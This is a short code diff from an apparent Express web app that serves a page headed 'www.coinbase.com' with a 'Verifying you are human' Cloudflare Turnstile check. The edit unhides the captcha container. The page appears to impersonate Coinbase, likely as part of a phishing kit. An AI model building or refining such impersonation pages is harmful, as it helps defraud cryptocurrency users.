@@ -1024,7 +1024,7 @@ app.get('/check-ip', async (req, res) => {
             <h1 class="h1">www.coinbase.com</h1>
             <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
             
-            <div id="captchaContainer" style="display: none;>
+            <div id="captchaContainer">
                 <div class="cf-turnstile" 
                     data-sitekey="${process.env.CLOUDFLARE_SITE_KEY}"
                     data-callback="onCaptchaSuccess"
